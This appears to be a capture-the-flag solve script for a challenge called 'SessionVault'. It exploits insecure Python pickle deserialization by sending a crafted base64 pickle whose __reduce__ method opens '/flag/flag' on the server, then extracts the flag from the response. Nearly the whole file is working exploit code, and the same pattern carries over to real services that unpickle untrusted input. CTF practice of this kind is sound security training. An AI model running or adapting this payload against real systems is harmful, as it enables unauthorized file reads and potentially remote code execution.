#!/usr/bin/env python3
"""
SessionVault (inj, 250) — CWE-94 Python pickle deserialization.

POST /restore pickle.loads() a base64 `blob` and previews it. Unpickling runs the
object's __reduce__ plan; since the preview reads file-like objects, we return
open('/flag/flag') so the restored object IS the flag file.

Usage:
    python3 solve.py                          # defaults to inj12.chal.deti:8051
    python3 solve.py http://inj12.chal.deti:8051
"""
import base64
import pickle
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://inj12.chal.deti:8051"
FLAG_RE = re.compile(r"flag\{[^}]*\}")


class R:
    def __reduce__(self):
        return (open, ("/flag/flag", "r"))


def main() -> int:
    blob = base64.b64encode(pickle.dumps(R())).decode()
    r = requests.post(f"{BASE}/restore", data={"blob": blob}, timeout=10)
    m = FLAG_RE.search(r.text)
    print(f"[+] FLAG: {m.group(0)}" if m else f"[i] preview:\n{r.text[-400:]}")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
